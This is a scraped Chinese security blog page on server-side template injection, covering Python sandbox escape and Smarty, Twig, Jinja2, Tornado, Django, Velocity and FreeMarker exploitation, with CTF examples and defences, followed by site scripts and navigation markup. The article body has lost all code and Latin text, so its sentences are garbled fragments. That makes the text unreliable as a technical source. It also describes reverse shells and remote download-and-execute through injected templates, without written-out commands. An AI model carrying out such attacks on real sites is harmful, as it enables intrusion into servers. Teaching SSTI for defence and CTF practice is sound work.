引用比如在中在中所以我们通过属性来调用这些函数例如如下调用来执行其中的语句通过内建函数来导入包万一跟上面一样禁用了当然还可以使用拼接的方式如果在中部分需要引用的函数被删除不能直接用属性来调用可以使用来重新加载如果仔细看上面的图片就可以看到在中也是的内建函数如果此函数被删除在中也不可以直接引用了中不再是内建函数之前是模块下的函数而之后是模块下的函数所以可以直接利用模块来导入也可以利用在所上的导入模块中系统的包都在一个默认路径下被的存储记录如果把其中的模块删除就不能再去加载模块了这时候需要手动把重新加载进去一般尝试默认路径或者查看存储路径魔法函数沙箱逃逸还是离不开继承关系和子父类关系在查看和使用类的继承魔法函数起到了不可比拟的作用先看看几个常用的魔法函数返回调用的类型查看类继承的所有父类直到获取类的所有子类返回所有直接父类组成的元组不返回类类实例创建之后调用对当前对象的实例的一些初始化输出能够返回函数所在模块命名空间的所有变量当类被调用的时候无条件进入此函数对象中不存在的属性时调用这时候不管调用什么属性都会返回相当于拦截了属性调用调用不存在的属性会执行相当于处理了类继承使用尝试利用继承关系来找到类前面不仅可以使用双引号还可以利用列表或者字典类型区别在查找类型的时候在不同的基础上查找返回都是元组在类下去查找所有的子类然后去查找可利用类返回是元组使用下标获得类找到需要使用的类其中有可以使用的类在中使用调用他们如果子类过多不好查找是第几个下标可以使用如下来标记先来读取一下文件盘下的文件从中查找是否有关于文件读取的方法比如函数在最后找到一个函数如果这里会报错添加如果想直接在终端显示出来在中可以使用如下形式读取文件的第一行在中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果执行命令但是如果使用字符串的形式会报如下错误因为获取的并不是类只需要再去获得一次即可特殊函数查找在的页面上把自带函数全部获取目前的的模块将这么模块进行筛选规则这些模块哪些有调用上面提到的模块或者文件读取等方法可利用模块数量为筛选完成后有两百个模块可能可以利用然后再利用脚本进一步筛选第一种遍历如第二种遍历如第三种遍历如第四种遍历如类很特殊在内部定义了然后模块包含有不具有通用性本质上跟第一种方法类似筛选出来的模块还是很多每个分块中不用的部分代表利用不同的方式为了更方便的利用进一步筛选具有更直接利用方式的类关注再命令执行和读写上既然筛选出来那么选其中一个利用来读取文件完整执行执行命令此处如果使用原作者给的第三种利用代码在中会报错中对于不再返回列表而是返回不可索引的对象的模块同样利用原代码进行筛选进一步获取可以直接执行命令或者读取文件的类选取其中一个执行命令输出父类最后一个父类为读取文件其中还可以执行的模块还有很多比如使用含有的其他模块来调用加载的等筛选代码来源沙箱逃逸总结参考沙箱逃逸与五模板是最流行的模板语言之一为不受信任的模板执行提供了安全模式这会强制执行在安全函数白名单中的函数因此我们在模板中无法直接调用中直接执行命令的函数相当于存在了一个但是实际上对语言的限制并不能影响我们执行命令因为我们首先考虑的应该是模板本身恰好很照顾我们在阅读模板的文档以后我们发现内置变量可用于访问各种环境变量比如我们使用得到这个类以后我们就去找给我们的的方法这个方法可以获取传入变量的流这个函数流程大致为打开你输入的文件判断文件名是否存在存在的话在循环中读取到文件全部内容赋值给变量如果不存在则看变量抛出不同问题分别为文件不存在或者文件内容为空因此我们可以用这个方法读文件同样这个类中有一个方法可以看到函数第三个参数一个类型后来找到了函数原型因此我们可以构造写个地址华东南赛区题目模拟了一个获取的并且可以在最下方看到可以确定页面使用的是模板引擎在页面的右上角发现了但是题目中显示的的由于环境的原因无法使用猜测这个受头控制将头改为会发现该位置的值变为了便可以确定这里存在直接构造即可得到常规利用方式获取的版本号执行相应的代码支持使用标签来执行被包裹其中的指令最常规的思路自然是先测试该标签但就该题目而言使用标签会报错因为在版本中已经废弃标签强烈建议不要使用在仅在中可用这个地方借助了这个标签因为可以让一个模板区域的字符原样输出这经常用于保护页面上的或样式表避免因为的定界符而错被解析但是这种写法只适用于环境这道使用的是所以依然失败类的方法的代码如下可以看到这个方法可以读取一个文件并返回其内容所以我们可以用来获取对象并调用这个方法然而使用这个会触发报错如下可见这个旧版本的利用方式并不适用于新版本的而且在的版本中官方已经把该静态方法删除对于那些文章提到的利用类的方法来写也由于同样的原因无法使用的条件判断和的非常相似只是增加了一些特性每个必须有一个配对的也可以使用和全部的条件表达式和函数都可以在内使用如等等如既然这样就将头改为同样还能用来执行一些系统命令漏洞成因本题中引发的代码简化后如下函数把标签替换成对象的变量显示模板可以看到这里使用字符串代替模板导致了注入的标签被直接解析执行产生了的模板注入如果是在处执行最好抓包打可能有编码的问题六模板是提供的一个既简单又强大的模板引擎关于模板这里不再多说请参考模板引擎遇到在学吧七引擎是来自于的模板引擎它非常易于安装和使用它的操作有点像和将用户输入作为模版变量的值使用一个加载器来定位模板以及一个环境变量来存储配置信息其中方法通过其第一个参数载入模板并通过第二个参数中的变量来渲染模板使用模版引擎渲染页面其中模版含有变量其模版变量值来自于请求参数显然这段代码并没有什么问题即使你想通过参数传递一段代码给服务端进行渲染也许你会认为这里可以进行但是由于模版引擎一般都默认对渲染的变量值进行编码和转义所以并不会造成跨站脚本攻击但是如果渲染的模版内容受到用户的控制情况就不一样了修改代码为将用户输入作为模版内容的一部分上面这段代码在构建模版时拼接了用户输入作为模板的内容现在如果再向服务端直接传递代码用户输入会原样输出测试结果显而易见如果服务端将用户的输入作为了模板的一部分那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出在模板引擎里除了可以输出传递的变量以外还能执行一些基本的表达式然后将其结果作为该模板变量的值例如这里用户输入则在服务端拼接的模版内容为尝试插入一些正常字符和模板引擎默认的注释符构造为实际服务端要进行编译的模板就被构造为由于作为模板引擎的默认注释形式所以在前端输出的时候并不会显示而作为模板变量最终会返回作为其值进行显示因此前端最终会返回内容通过上面两个简单的示例就能得到扫描检测的大致流程这里以为例同常规的注入检测检测一样模板注入漏洞的检测也是向传递的参数中承载特定并根据返回的内容来进行判断的每一个模板引擎都有着自己的语法的构造需要针对各类模板引擎制定其不同的扫描规则就如同注入中有着不同的数据库类型一样简单来说就是更改请求参数使之承载含有模板引擎语法的通过页面渲染返回的内容检测承载的是否有得到编译解析有解析则可以判定含有对应模板引擎注入否则不存在凡是使用模板的网站基本都会存在只是能否控制其传参而已接下来借助的代码来实践演示一下注入如果在页面的源代码中看到了诸如以下的字符就可以推断网站使用了某些模板引擎来呈现数据通过注入了探测字符串以查看应用程序是否进行了相应的计算根据这个响应我们可以推测这里使用了模板引擎因为这符合它们对于的处理方式在这里提供一个针对的攻击载荷使用生成了一个有效载荷进行监听模板注入远程下载并重命名运行以上就是模板注入由于以上使用的为版本现在官方已经更新到版本根据官方文档新增了和等内容补充一些新版本的具体分析详见全版本通用利用为反弹是执行命令的地方这个好像只能回显最前面的一个补充全版本通用八模板是中的一个渲染函数也就是一种模板通过调用的参数不同生成不同的网页如果用户对内容可控不仅可以注入代码而且还可以通过进行传递变量和执行简单的表达式以下代码将定义一个变量作为一个模板文件然后使用传入的替换模板中的在进行加载模板并输出且未对值进行安全检查输入情况这里拿一道的题来演示一下模板注入护网杯根据上面的信息我们知道在文件中是中的一个渲染函数也就是一种模板通过调用的参数不同生成不同的网页配合使用最后就是这段代码再来分析我们访问的链接推测加密过后的值就是中对应的值想获得只要我们在中传入文件和所以关键是获取在模板中存在一些可以访问的快速对象比如这个其实就是对象里面存储着一些环境变量具体分析请参照模板注入观察错误页面发现页面返回的由的值决定修改的值注入获得环境变量得到的值根据上面的进行算法重构就可以得到这里给出的转换脚本得到得到九模板先看存在漏洞的代码很明显就是注入点但是条件被限制的很死很难执行命令现在拿到的只有有一个和有关的变量这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性看这个空框架有什么属性和类之间的引用后来发现自带的应用也就是自带的后台的中导入了当前网站的配置文件所以可以通过某种方式找到默认应用的再通过这个获取对象进而获取数据库账号密码加密密钥等信息如下十模板以下板块参照自漏洞浅析是一个基于的模板引擎它提供了一个模板语言去引用由代码定义的对象是基金会旗下的一个开源软件项目旨在确保应用程序在表示层和业务逻辑层之间的隔离即设计模式基本语法语句标识符用来标识的脚本语句包括等语句变量用来标识一个变量比如模板文件中为可以获取通过上下文传递的声明用于声明脚本变量变量可以在脚本中声明注释单行注释为多行注释为成对出现的条件语句以为例转义字符如果已经被定义但是又需要原样输出可以试用转义作为关键的基础使用使用主要流程为初始化模板引擎包括模板路径加载类型等创建用于存储预传递到模板文件的数据的上下文选择具体的模板文件传递数据完成渲染模板文件输出结果通过创建模板引擎接着设置模板路径加载器类型为最后通过完成引擎初始化通过创建上下文变量通过添加模板中使用的变量到上下文通过选择路径中具体的模板文件创建对象存储渲染结果然后将上下文变量传入进行渲染比如这里使用里面的代码延迟了秒参照白头搔更短惹人心简单进行调试在最初的层下断点来追踪的解析过程进入方法继续跟进方法类中封装了方法被强制转化类型跟进方法查看详情继续跟进方法继续跟进方法继续跟进继续看方法跟进方法可以看到这是最后一步了调试结束就可以看到已经成功被执行看一下上图中的循环的代码大概意思是当遍历的节点时候这时候就会一步步的保存我们的最终导致未授权分析根据官方文档的描述可以看到这是由这个插件造成的利用而造成的在经过后可以确定触发漏洞的关键点在于对包中的字段具体漏洞代码调试可以参考未授权模板注入代码执行未授权分析未授权分析漏洞概述十一是一款模板引擎即一种基于模板和要改变的数据并用来生成输出文本网页电子邮件配置文件源代码等的通用工具它不是面向最终用户的而是一个类库是一款程序员可以嵌入他们所开发产品的组件模板代码这是注释模板文件存放在服务器上就像通常存放静态页面那样当有人来访问这个页面将会介入执行然后动态转换模板用最新的数据内容替换模板中的部分之后将结果发送到访问者的浏览器中这个模板主要用于用户可以通过实现来用创建任意对象具体的高级内置函数定义参考主要的用法如下创建一个用户定义的指令调用类的参数构造函数创建一个用户定义的指令用一个数字参数调用构造函数调用了构造函数创建了一个对象那么这个中就是调用的的内置执行命令的对象里面有个类这个类会执行它的参数因此我们可以利用函数新建一个类传输我们要执行的命令作为参数从而构造远程命令执行漏洞构造里面的可以通过自定义标签的方式执行命令从而构造远程命令执行漏洞这里使用测试代码来大概演示一下代码演示说明前端代码后端代码上述代码主要编译给定的模板字符串和数据生成进行输出模板注入的前提是在无过滤的情况下使用模板来解析我们输入的字符可以通过页面上的变化来判断我们输入的内容是否被解析如上图我们输入的内容被成功解析到页面上并且没有过滤首先需要控制被攻击模板的内容也就是要将本来无危害的模板文件实时更改为可攻击的模板内容使用的关键代码在上图的红框中接收用户传入的参数使用获取值遍历相应的模块名字使用来加载模板内容并使用将对应的也就是写入中这样就可以覆盖文件的内容具体如下重新更改了加载的模板内容后然后直接访问受影响的模板文件路径此时恶意的模板文件内容就会被加载成功了并执行了系统命令平台也受到了请求后言由于本篇文章篇幅过长容易脑壳疼所以分为上下篇上篇大概介绍了几种语言常见的几种模板注入下篇分析几个的模板注入包括海洋等参考十二自动化工具手动安装具体参考输入以上命令随后即可得到参考模板这里推荐自动化工具拿执行命令反弹上传下载文件为的利用提供了很大的便利地址一键真香还支持其他模板的注入检测十三漏洞防御和其他的注入防御一样绝对不要让用户对传入模板的内容或者模板本身进行控制减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式使用正规的模板渲染方法尽可能加载静态模板文件另一个选择是创建一个安全加固沙箱环境禁用或删除潜在的危险指令',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-05-02 12:34:03',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">浅析SSTI漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-06T08:20:21.286Z" title="发表于 2023-08-06 16:20:21">2023-08-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-02T04:34:03.358Z" title="更新于 2024-05-02 12:34:03">2024-05-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">26.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>112分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="浅析SSTI漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/08/06/qian-xi-ssti-lou-dong/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/08/06/qian-xi-ssti-lou-dong/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg 